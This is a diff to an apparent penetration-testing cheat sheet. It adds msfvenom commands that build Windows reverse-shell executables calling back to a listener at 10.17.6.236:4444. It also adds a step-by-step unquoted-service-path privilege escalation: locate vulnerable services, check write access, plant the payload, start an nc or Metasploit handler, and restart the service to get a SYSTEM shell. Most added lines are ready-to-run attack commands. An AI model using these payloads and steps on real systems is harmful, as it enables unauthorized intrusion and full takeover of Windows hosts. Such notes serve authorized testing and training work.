@@ -623,8 +623,13 @@ smb: \> mget *
     - Some Example vectors
         - Jenkins Script Console
 
+##### Msfvenom (staged Non-meterpreter binaries)
+https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+-exe
+    - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe `
 
 ##### Msfvenom (staged meterpreter binaries)
+https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
 - asp
     - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.12.2 LPORT=1234 -f asp > shell.asp`
 
@@ -932,6 +937,44 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 
 - Download WinPeas
     - `https://github.com/carlospolop/PEASS-ng/releases/download/20230101/winPEASx64.exe`
+
+
+###### UnquotedServicePath
+
+- Find the unquoted service path
+> `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
+
+- Check if we/Users have write access to that folder using `icacls` 
+
+> `icacls "C:\Program Files\Zero Tier`
+
+- If write access is there, then generate payload with folder name where space starts.
+
+(non-meterpreter binary)
+>  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe  ` 
+
+(meterpreter binary)
+> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe`
+
+
+- Transfer payload to target server by whatever method
+
+- Start listener on attacker machine
+
+(for non-meterpreter binary)
+> `nc -nlvp 4444`
+
+(for meterpreter binary)
+
+> use multi/handler
+
+- Now start the service using cmd or poweshell
+
+>`net start zerotieroneservice`
+
+>`Start-Service zerotieroneservice`
+
+- We get the reversehell with Privileged user/NT Authority
 
 **Privilege Escalation by Bypassing UAC prompt**
 
@@ -1723,7 +1766,7 @@ alternatives available for NTLM and Kerberos auth are as follows.
 
 
 
-### [Pivoting](#)
+### [PIVOTING](#)
 
 #### Hosts Discovery
 
